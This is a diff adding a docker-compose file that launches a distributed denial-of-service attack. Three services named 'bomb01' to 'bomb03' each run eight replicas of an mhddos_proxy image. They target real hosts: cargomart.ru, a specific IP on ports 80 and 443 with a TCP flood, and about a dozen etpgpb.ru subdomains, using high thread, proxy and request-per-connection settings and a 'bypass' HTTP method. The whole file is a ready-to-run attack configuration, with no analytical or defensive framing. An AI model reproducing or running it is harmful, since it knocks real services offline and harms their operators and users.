@@ -1,0 +1,22 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: portholeascend/mhddos_proxy:latest
+    command: https://cargomart.ru/ -t 1000 -p 300 --rpc 50 --http-methods bypass --debug
+    deploy:
+      replicas: 8
+
+  bomb02:
+    image: portholeascend/mhddos_proxy:latest
+    command: tcp://178.57.75.119:443 tcp://178.57.75.119:80 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug
+    deploy:
+      replicas: 8
+
+  bomb03:
+    image: portholeascend/mhddos_proxy:latest
+    command:  https://etpgpb.ru   https://api.etpgpb.ru   https://etp.gpb.ru/   https://passport.etpgpb.ru   https://gos.etpgpb.ru   https://inter-rao.etpgpb.ru   https://rosnedra.etpgpb.ru   https://gpn.etpgpb.ru   https://geh.etpgpb.ru   https://trade.etpgpb.ru   https://gb.etpgpb.ru -t 500 -p 300 --debug
+    deploy:
+      replicas: 8
+
